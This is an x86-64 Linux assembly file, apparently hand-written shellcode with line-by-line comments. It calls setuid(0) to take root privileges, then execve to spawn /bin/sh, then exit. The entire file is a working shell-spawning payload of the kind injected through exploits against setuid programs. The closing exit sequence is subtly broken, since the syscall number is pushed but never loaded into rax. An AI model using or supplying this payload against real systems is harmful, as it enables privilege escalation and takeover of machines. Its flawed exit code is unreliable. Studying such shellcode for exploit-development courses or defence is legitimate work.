section .text
    global _start

_start:

    ; setuid syscall
    xor eax, eax    ; make zero for put syscall number
    xor edi, edi    ; 1st arg = 0 (uid = 0, root)
    mov al, 0x69    ; setuid syscall number
    syscall

    ; execve syscall
    lea rdi, [rel shell]  ; 1st arg = string(/bin/sh);
    xor esi, esi    ; 2nd arg = 0(argv[]);
    push 0x3b       ; execve syscall number
    pop rax         ; get the syscall number without zeroing the register.
    cdq             ; so rax hasn't sign value. And now rdx(third arg) also became 0(envp[]).
    syscall 

    ; exit syscall
    xor edi, edi    ; 1st arg = 0
    push 0x3c       ; `exit syscall` number push to the stack
    syscall

shell:
    db "/bin/sh", 0 ; string
